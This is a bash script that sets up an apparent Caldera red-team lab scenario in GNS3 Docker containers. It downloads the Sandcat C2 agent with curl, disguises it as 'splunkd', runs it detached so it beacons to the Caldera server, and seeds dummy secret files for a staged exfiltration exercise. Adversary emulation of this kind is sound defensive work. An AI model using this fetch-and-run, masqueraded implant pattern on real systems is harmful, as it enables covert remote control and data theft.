#!/usr/bin/env bash
#
# Thief-on-Bank setup — run on the Caldera/GNS3 host (azureuser@FullBank)
# ------------------------------------------------------------------------
# Deploys Thief's OWN Sandcat agent directly onto DVR_ssh-1, independent of
# the BGU Test Adversary chain entirely. This does NOT reuse testuser or
# any BGU-specific credentials/paths — those belong to a different
# adversary and have no bearing on how Thief is deployed here.
#
# Bank containers are reachable via PLAIN, single-layer `docker exec
# <container_id>` directly from this host — no nested gns3-server wrapper
# (confirmed by Bank_Mitigation_Strategy_Concise.md's working commands).
#
# Rather than assume a user/home path, this script DISCOVERS whichever
# user `docker exec` lands as by default and uses that consistently
# throughout — avoiding the exact mistake made in the previous version of
# this script (assuming `testuser`, which came from the unrelated BGU
# adversary and was never actually verified against this scenario).
#
# Caldera server for Bank: 172.17.0.1:8888 (per Bank_Mitigation_Strategy_Concise.md).
 
set -uo pipefail
 
PROJECT_ID="${PROJECT_ID:-}"
PROJECT_NAME_PATTERN="${PROJECT_NAME_PATTERN:-Bank}"
CALDERA_SERVER="http://172.17.0.1:8888"
GNS3_API="http://localhost:3080"   # adjust if Bank's GNS3 API differs
 
# ---- 1. Resolve project ID ----
if [ -z "$PROJECT_ID" ]; then
  echo "== No PROJECT_ID set — searching projects matching '$PROJECT_NAME_PATTERN' =="
  MATCHES=$(curl -s "${GNS3_API}/v2/projects" | python3 -c "
import json, sys
pat = '''$PROJECT_NAME_PATTERN'''
for p in json.load(sys.stdin):
    if pat.lower() in p.get('name','').lower():
        print(p.get('project_id'), '|', p.get('status'), '|', p.get('name'))
")
  MATCH_COUNT=$(echo "$MATCHES" | grep -c . || true)
  if [ "$MATCH_COUNT" -eq 0 ]; then
    echo "!! No project matched '$PROJECT_NAME_PATTERN'. Set PROJECT_ID explicitly and re-run:" >&2
    echo "   PROJECT_ID=<id> $0" >&2
    exit 1
  elif [ "$MATCH_COUNT" -eq 1 ]; then
    PROJECT_ID=$(echo "$MATCHES" | cut -d'|' -f1 | tr -d ' ')
    echo "   found: $MATCHES"
  else
    OPENED=$(echo "$MATCHES" | grep '| opened |' || true)
    OPENED_COUNT=$(echo "$OPENED" | grep -c . || true)
    if [ "$OPENED_COUNT" -eq 1 ]; then
      PROJECT_ID=$(echo "$OPENED" | cut -d'|' -f1 | tr -d ' ')
      echo "   multiple name matches, exactly one is 'opened' — using it:"
      echo "   $OPENED"
    else
      echo "!! Multiple candidate projects, can't pick automatically:" >&2
      echo "$MATCHES" >&2
      echo "   Set PROJECT_ID explicitly and re-run:" >&2
      echo "   PROJECT_ID=<id> $0" >&2
      exit 1
    fi
  fi
fi
echo "== Using project: $PROJECT_ID =="
 
# ---- 2. Resolve DVR_ssh-1's container ID and status ----
DVR_INFO=$(curl -s "${GNS3_API}/v2/projects/${PROJECT_ID}/nodes" | python3 -c "
import json, sys
for n in json.load(sys.stdin):
    if n.get('name') == 'DVR_ssh-1':
        print(n.get('node_id',''), '|', n.get('status',''), '|', n.get('properties', {}).get('container_id',''))
")
if [ -z "$DVR_INFO" ]; then
  echo "!! No node named 'DVR_ssh-1' found in project $PROJECT_ID" >&2
  exit 1
fi
DVR_NODE_ID=$(echo "$DVR_INFO" | cut -d'|' -f1 | tr -d ' ')
DVR_STATUS=$(echo "$DVR_INFO" | cut -d'|' -f2 | tr -d ' ')
DVR_ID=$(echo "$DVR_INFO" | cut -d'|' -f3 | tr -d ' ')
echo "== DVR_ssh-1: node_id=$DVR_NODE_ID status=$DVR_STATUS container_id=$DVR_ID =="
 
if [ "$DVR_STATUS" != "started" ]; then
  echo "== DVR_ssh-1 not started — starting it =="
  curl -s -X POST "${GNS3_API}/v2/projects/${PROJECT_ID}/nodes/${DVR_NODE_ID}/start" > /dev/null
  sleep 5
fi
 
# ---- 3. Discover the actual default exec user and home directory (do NOT assume) ----
echo "== Discovering default docker-exec user and home directory =="
EXEC_USER=$(docker exec "$DVR_ID" whoami)
EXEC_HOME=$(docker exec "$DVR_ID" sh -c 'echo $HOME')
if [ -z "$EXEC_HOME" ] || [ "$EXEC_HOME" = "/" ]; then
  # some minimal images don't export $HOME for non-login execs; fall back to /etc/passwd
  EXEC_HOME=$(docker exec "$DVR_ID" sh -c "getent passwd \"\$(whoami)\" | cut -d: -f6")
fi
echo "   default exec user: $EXEC_USER"
echo "   home directory:    $EXEC_HOME"
if [ -z "$EXEC_USER" ] || [ -z "$EXEC_HOME" ]; then
  echo "!! Could not determine user/home reliably — stopping rather than guessing." >&2
  exit 1
fi
 
# ---- 4. Confirm reachability to Caldera ----
echo "== Checking reachability to Caldera ($CALDERA_SERVER) from DVR_ssh-1 =="
HTTP_CODE=$(docker exec "$DVR_ID" curl -s -o /dev/null -w '%{http_code}' --max-time 5 "$CALDERA_SERVER")
if [ "$HTTP_CODE" != "200" ]; then
  echo "!! Caldera not reachable from DVR_ssh-1 (got HTTP $HTTP_CODE)." >&2
  echo "   Check routing/NAT on the Bank Docker bridge before continuing." >&2
  exit 1
fi
echo "   reachable (HTTP 200)"
 
CALDERA_API_KEY="${CALDERA_API_KEY:-}"   # optional — set this to enable the stronger API-side check in step 6b
 
# ---- 5. Deploy Thief's own Sandcat agent (skip only if genuinely already beaconing) ----
echo "== Checking for an existing agent process =="
# NOTE: must match the invocation itself ("splunkd -server ..."), NOT
# "${EXEC_HOME}/splunkd" — that pattern is a substring of the log redirect
# target ("/root/splunkd.log"), causing pgrep -f to false-positive match a
# leftover/dead process's command-line text rather than confirming a live,
# beaconing agent. This was silently skipping every redeploy attempt.
#
# ALSO: use ps+grep with the bracket trick ('[s]plunkd'), not `pgrep -f`
# directly. Some minimal/BusyBox pgrep builds do not exclude their own PID
# from results — since pgrep's own command line literally contains the
# search string ("pgrep -f splunkd -server"), it can match itself, returning
# a new, different, ephemeral PID on every single call. That's exactly what
# was happening here (pid 987 then pid 1001 moments later, same run, no
# deploy in between) — every "existing agent" detected so far was pgrep
# matching itself, never a real process. The bracketed pattern can't match
# its own invocation, because grep's own argv contains the literal text
# "[s]plunkd" (with brackets), which the compiled regex /[s]plunkd/ does not
# match against itself.
EXISTING_LINE=$(docker exec "$DVR_ID" sh -c "ps aux | grep '[s]plunkd -server'" 2>/dev/null || true)
EXISTING_PID=$(echo "$EXISTING_LINE" | awk '{print $2}' | head -1)
if [ -n "$EXISTING_PID" ]; then
  echo "   process matched (pid $EXISTING_PID) — checking log before trusting this as a live agent:"
  docker exec "$DVR_ID" sh -c "cat $EXEC_HOME/splunkd.log 2>&1 || echo '(no log file found — this pid is NOT a healthy agent)'"
  echo "   skipping deploy. See beacon verification below for whether this pid is actually healthy."
else
  echo "== Downloading agent binary =="
  docker exec "$DVR_ID" sh -c "
server=$CALDERA_SERVER
curl -s -X POST -H file:sandcat.go -H platform:linux \$server/file/download > $EXEC_HOME/splunkd
chmod +x $EXEC_HOME/splunkd
"
  echo "== Launching agent via 'docker exec -d' (detached at the Docker level, not nohup+&) =="
  # nohup + backgrounding inside a single `docker exec` is NOT reliable here:
  # Docker can tear down the entire cgroup/process group it created for that
  # exec session once the session ends, killing the backgrounded process
  # despite nohup (nohup only blocks SIGHUP, it does not protect against
  # Docker's own exec-session cleanup). `docker exec -d` instead tells Docker
  # itself to launch the process detached, so it survives independently of
  # this shell's exec session.
  docker exec -d "$DVR_ID" sh -c "cd $EXEC_HOME && ./splunkd -server $CALDERA_SERVER -group red -v > $EXEC_HOME/splunkd.log 2>&1"
  sleep 5
fi
 
# ---- 6. Verify the agent is ACTUALLY beaconing — process-alive is not sufficient on its own ----
echo ""
echo "== Verifying beacon status =="
 
echo "-- 6a. Process check --"
ALIVE_LINE=$(docker exec "$DVR_ID" sh -c "ps aux | grep '[s]plunkd -server'" 2>/dev/null || true)
ALIVE_PID=$(echo "$ALIVE_LINE" | awk '{print $2}' | head -1)
if [ -z "$ALIVE_PID" ]; then
  echo "   !! No splunkd process found. Agent did not start or died immediately."
else
  echo "   process alive, pid $ALIVE_PID"
fi
 
echo "-- 6b. Log content check (authoritative for this environment) --"
# This exact string is the same signal already used to confirm successful
# beaconing elsewhere in this project (Bank_Mitigation_Strategy_Concise.md) —
# a live process alone does not prove the agent ever completed its handshake
# with Caldera, but this log line does.
LOG_CONTENT=$(docker exec "$DVR_ID" sh -c "cat $EXEC_HOME/splunkd.log 2>&1" || true)
echo "$LOG_CONTENT"
if echo "$LOG_CONTENT" | grep -qi "Beacon (HTTP): ALIVE"; then
  BEACON_CONFIRMED=1
  echo "   confirmed — log shows a successful beacon."
else
  BEACON_CONFIRMED=0
  echo "   !! No 'Beacon (HTTP): ALIVE' line found in the log. Agent has NOT confirmed beaconing to Caldera."
fi
 
echo "-- 6c. Caldera-side check (optional, stronger — requires CALDERA_API_KEY) --"
if [ -n "$CALDERA_API_KEY" ]; then
  AGENT_JSON=$(curl -s -H "KEY: $CALDERA_API_KEY" "$CALDERA_SERVER/api/v2/agents" | python3 -c "
import json, sys
try:
    agents = json.load(sys.stdin)
except Exception:
    print('PARSE_ERROR'); sys.exit(0)
for a in agents:
    if a.get('host') == 'DVR_ssh-1':
        print(a.get('paw'), '|', a.get('trusted'), '|', a.get('last_seen'))
")
  if [ -z "$AGENT_JSON" ]; then
    echo "   !! No agent with host == 'DVR_ssh-1' found in Caldera's /api/v2/agents response."
    echo "      Either it hasn't registered yet, or CALDERA_API_KEY is wrong (check for a JSON auth error above)."
  elif [ "$AGENT_JSON" = "PARSE_ERROR" ]; then
    echo "   !! Could not parse Caldera's response — likely an auth failure. Check CALDERA_API_KEY."
  else
    echo "   confirmed via Caldera API — paw | trusted | last_seen:"
    echo "   $AGENT_JSON"
  fi
else
  echo "   skipped — set CALDERA_API_KEY=<your red API key> to enable this stronger check"
  echo "   (find it in Caldera's conf/local.yml under api_key_red, or the web UI's settings)."
fi
 
echo ""
if [ "$BEACON_CONFIRMED" = "1" ]; then
  echo "== VERDICT: Agent on DVR_ssh-1 is confirmed beaconing. =="
else
  echo "!! VERDICT: Agent on DVR_ssh-1 is NOT confirmed beaconing. Do not proceed to the Thief" >&2
  echo "   operation until this is resolved — check network reachability, the log above, and" >&2
  echo "   whether the download step actually completed (splunkd could be a truncated/corrupt binary)." >&2
fi
 
# ---- 7. Environment fitness check: does tar support -P? ----
echo "== Verifying tar on DVR_ssh-1 supports -P =="
TAR_CHECK=$(docker exec "$DVR_ID" sh -c "tar -P -cf /tmp/tar-fitness-check.tar /etc/hostname 2>&1")
if echo "$TAR_CHECK" | grep -qi "unrecognized option\|invalid option"; then
  echo "   !! tar does not support -P on this image — a wrapper will be needed" >&2
  echo "      (same technique as UK-Office's /usr/local/sbin/tar fix)." >&2
else
  echo "   ok — tar supports -P"
fi
docker exec "$DVR_ID" rm -f /tmp/tar-fitness-check.tar >/dev/null 2>&1
 
# ---- 8. Clear any stale attack artifacts from a previous run ----
echo "== Clearing any stale staged/archive artifacts =="
docker exec "$DVR_ID" rm -rf "$EXEC_HOME/staged" "$EXEC_HOME/staged.tar.gz"
 
# ---- 9. Seed the sensitive dummy files (same three files/extensions as UK-Office) ----
echo "== Seeding sensitive dummy files in $EXEC_HOME =="
docker exec "$DVR_ID" sh -c "echo dummy-secret > $EXEC_HOME/secrets.yml"
docker exec "$DVR_ID" sh -c "echo dummy-audio > $EXEC_HOME/recording.wav"
docker exec "$DVR_ID" sh -c "echo dummy-image > $EXEC_HOME/photo.png"
 
echo ""
echo "== Verification =="
docker exec "$DVR_ID" sh -c "ls -la $EXEC_HOME/*.yml $EXEC_HOME/*.wav $EXEC_HOME/*.png"
docker exec "$DVR_ID" ps aux | grep '[s]plunkd'
 
echo ""
if [ "$BEACON_CONFIRMED" = "1" ]; then
  echo "== Done. DVR_ssh-1 ($DVR_ID) has a confirmed-beaconing agent and is ready for a standalone Thief run. =="
else
  echo "!! Done seeding files, but the agent is NOT confirmed beaconing (see VERDICT above)." >&2
  echo "   Do not start the Thief operation yet — Caldera will show no agent, or a dead one, for this host." >&2
fi
echo "   Confirmed exec user: $EXEC_USER, home: $EXEC_HOME"
echo "   Use this same EXEC_HOME path when applying the mitigation."